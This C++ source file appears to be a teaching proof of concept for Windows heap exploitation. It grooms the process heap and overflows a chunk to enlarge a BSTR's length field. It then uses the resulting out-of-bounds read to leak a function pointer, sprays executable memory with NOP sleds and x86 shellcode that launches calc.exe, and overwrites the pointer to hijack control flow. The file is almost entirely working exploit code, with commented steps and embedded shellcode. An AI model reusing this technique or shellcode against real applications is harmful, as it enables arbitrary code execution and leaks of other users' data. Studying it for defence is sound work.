#include <Windows.h>
#include <comdef.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <iostream>
using namespace std;

#define CHUNK_SIZE 0x190
#define HEAP_SPRAY_SIZE 0x10000
#define ALLOC_COUNT 10
#define HEAP_SPRAY_COUNT 500

// Author: Carlos Dominguez
// Based on: https://medium.com/@SecWithShobhit/-3918446f8140 and https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/
// Compile: g++-32 .\spray-heap-overflow-32.cpp -o .\spray-heap-overflow-32.exe -loleaut32 -fpermissive [-g]

// some object from an app
void function1(void) {
  puts("Hola");
}

// pointer to function
typedef struct {
  void (*fp)();
} vtable_fp;

int main(int argc, char** argv) {
  int i;
  BSTR bstr;
  BSTR bstrAtHole;
  BOOL result;
  HANDLE hChunk;
  void* allocations[ALLOC_COUNT];
  void* heapSpray[HEAP_SPRAY_COUNT];
  BSTR bStrings[5];
  char overwrittingAddr[4] = {0x02, 0x02, 0x02, 0x02};
  vtable_fp someFunc;
  someFunc.fp = &function1;

  if (argc > 2) {
    // Predicable address to a NOP operation
    fprintf(stderr, "Use .\\heap-overflow [Overwritting address with bytes values format or \"0x02020202\" at default]\n");
    return -1;
  }
  else if (argc == 2) {
    unsigned int value = (unsigned int)strtoul(argv[1], NULL, 0);
    if (value < 0x00010000 || value > 0x80000000) {
      fprintf(stderr, "Error: Incorrect address, adress must be between 0x00010000 and 0x80000000\n");
      return -1;
    }
    memcpy(overwrittingAddr, &value, 4);
  }

  HANDLE defaultHeap = GetProcessHeap();
  if (defaultHeap == NULL) {
    printf("No process heap. Are you having a bad day?\n");
    return -1;
  }

  printf("Default heap = 0x%08x\n", defaultHeap);

  // We seek to accommodate memory in a predictable configuration. To do this, we must make a maximum of 18 allocations
  // This is because the backend is more predictable than the front-end, which is activated after 18 allocations of equal size
  // In addition, we must take care with first and last allocations that may have a different address gap than the rest, which will have jumps of equal size
  printf("The following should be all in the backend allocator\n");
  for (i = 0; i < ALLOC_COUNT; i++) {
    hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
    memset(hChunk, 'A', CHUNK_SIZE);
    allocations[i] = hChunk;
    printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
  }

  // After this, some of the intermediate allocations are freed in order to create a hole, such as:
  // [ Chunk 1 ][ Free chunk ][ Chunk 3 ] 
  printf("Freeing allocation at index 3: 0x%08x\n", allocations[3]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  // We try to fill the hole with some kind of object with a size header you could modify (goal of attack to leak adyacent information)
  // Usually, the ideal chunks are actually objects from the application, but a recognizable object in memory is enough for this demonstration
  // Fill with several objects to incresa the chances of sucess
  for (i = 0; i < 5; i++) {
    bstr = SysAllocString(L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    bStrings[i] = bstr;
    printf("[%d] BSTR string : 0x%08x\n", i, bstr);
    if(allocations[3] + 4 == bstr) bstrAtHole = bstr;
  }
  
  // Now, we need to free up the next chunk after the hole to fill it with any object we want to leak (ideally, it is filled with objects from the app)
  // [ Chunk 1 ][ BSTR ][ Free Chunk ]
  printf("Freeing allocation at index 4 : 0x%08x\n", allocations[4]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[4]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  // We fill the new hole with pointers of SomeObject that we want to leak to obtain it vtable address
  // [ Chunk 1 ][ BSTR ][ Array of pointers ]
  printf("SomeFunc address : 0x%08x\n", someFunc);
  printf("Allocating SomeFunc to vectors\n");
  vector<vtable_fp> array1(40, someFunc);
  vector<vtable_fp> array2(40, someFunc);
  vector<vtable_fp> array3(40, someFunc);
  vector<vtable_fp> array4(40, someFunc);
  vector<vtable_fp> array5(40, someFunc);
  vector<vtable_fp> array6(40, someFunc);
  vector<vtable_fp> array7(40, someFunc);
  vector<vtable_fp> array8(40, someFunc);
  vector<vtable_fp> array9(40, someFunc);
  vector<vtable_fp> array10(40, someFunc);

  // We see the initial size of the object placed in the first hole. This is stored in the first 4 bytes of the chunk where the BSTR is stored
  UINT strSize = SysStringByteLen(bstrAtHole);
  printf("Original String size: %d\n", (int) strSize);
  //DebugBreak();

  // First pause to analyze memory before attack
  system("PAUSE");

  // Shellcode to open calc.exe and run an infinite loop to don't stop process and can analyse the memory
  char shellcode[] = "\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e"
                        "\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43"
                        "\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b"
                        "\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75"
                        "\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61"
                        "\xc3\x68\x98\xfe\x8a\x0e\xff\x55\x04\x89\x45\x10\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x14\x31\xc0"
                        "\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x5b\x31\xc0\x50\x53\xff\x55\x10\x31\xc0\x50\x6a\xff"
                        "\xEB\xFE\x90";

  // Create multiple allocations (heap spray) to fill enough space in memory with NOP operations followed by the above shellcode
  // The goal of the attack is execute arbitrary code by overwritting one function/method address which someone execute at anytime
  printf("Spraying heap with shellcode that open calc.exe\n");
  for(int i = 0; i < HEAP_SPRAY_COUNT; i++) {
    heapSpray[i] = VirtualAlloc(NULL, HEAP_SPRAY_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("[%d] Heap spray chunk: 0x%p\n", i, heapSpray[i]);
    memset(heapSpray[i], 0x90, HEAP_SPRAY_SIZE - sizeof(shellcode)); 
    memcpy((char *)heapSpray[i] + HEAP_SPRAY_SIZE - sizeof(shellcode), shellcode, sizeof(shellcode));
  }
  //DebugBreak();

  // Second pause to analyze memory after spray and before overflow
  system("PAUSE");

  // Fill the previous chunk of BSTR chunk and overflow it to change the size of BSTR  
  printf("Overflowing allocation 2\n");
  int allocOffset = (int) allocations[3] - (int) allocations[2];
  std::string evilString;
  evilString.append(allocOffset, 'B');
  evilString.append("\x20\x01\x00", 3);
  memcpy(allocations[2], evilString.data(), evilString.size());

  // Print new size of BSTR (not modified by a legitimate user, but by the attacker)
  // This BSTR size change allow an attacker to see information after his allocated space, 
  // so attacaker can see data from other users (dta that ideally filled the second hole)
  strSize = SysStringByteLen(bstrAtHole);
  printf("Modified String size: %d\n", (int) strSize);
  //DebugBreak();

  // Access to data out of space of original BSTR (attacker access to data inside the chunk with object of other users)
  std::wstring ws(bstrAtHole, SysStringLen(bstrAtHole));
  std::string s(reinterpret_cast<const char*>(ws.data()), strSize);
  std::string ref = s.substr(248+28, 4);
 
  // Use data leaked to reconstruct the address of someFunc (to probe the address that we will replace with any NOP/shellcode address)
  char buf[4];
  memcpy(buf, ref.data(), 4);
  int refAddr = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
  printf("SomeFunc leak: 0x%08x\n", refAddr);
  //DebugBreak();

  // Overwritte some function1 pointer with predicable pointer to a NOP operation
  BYTE* pointerToShellcode = reinterpret_cast<BYTE*>(bstrAtHole); 
  memcpy(pointerToShellcode + 248 + 28, overwrittingAddr, 4);
  //DebugBreak();
  
  // Execute all function1 of all instances (similar to executions of other users into an app)
  // When we hit overwritten function address, calc.exe will be open and process will fall into an infinite loop
  printf("====================================\n");
  printf("Call all function1 instances:\n");
  for(int i = 0; i < array1.size(); i++) {
    printf("Array 1 [%d] (0x%08x): ", i, &(array1[i]));
    array1[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array2.size(); i++) {
    printf("Array 2 [%d] (0x%08x): ", i, &(array2[i]));
    array2[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array3.size(); i++) {
    printf("Array 3 [%d] (0x%08x): ", i, &(array3[i]));
    array3[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array4.size(); i++) {
    printf("Array 4 [%d] (0x%08x): ", i, &(array4[i]));
    array4[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array5.size(); i++) {
    printf("Array 5 [%d] (0x%08x): ", i, &(array5[i]));
    array5[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array6.size(); i++) {
    printf("Array 6 [%d] (0x%08x): ", i, &(array6[i]));
    array6[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array7.size(); i++) {
    printf("Array 7 [%d] (0x%08x): ", i, &(array7[i]));
    array7[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array8.size(); i++) {
    printf("Array 8 [%d] (0x%08x): ", i, &(array8[i]));
    array8[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array9.size(); i++) {
    printf("Array 9 [%d] (0x%08x): ", i, &(array9[i]));
    array9[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array10.size(); i++) {
    printf("Array 10 [%d] (0x%08x): ", i, &(array10[i]));
    array10[i].fp();
  }
  //DebugBreak();

  // Last pause to analyze memory after overflow (not necessary because shellcode execute infinite loop)
  system("PAUSE");

  for(int i = 0; i < HEAP_SPRAY_COUNT; i++)
    VirtualFree(heapSpray[i], 0, MEM_RELEASE);

  return 0;
}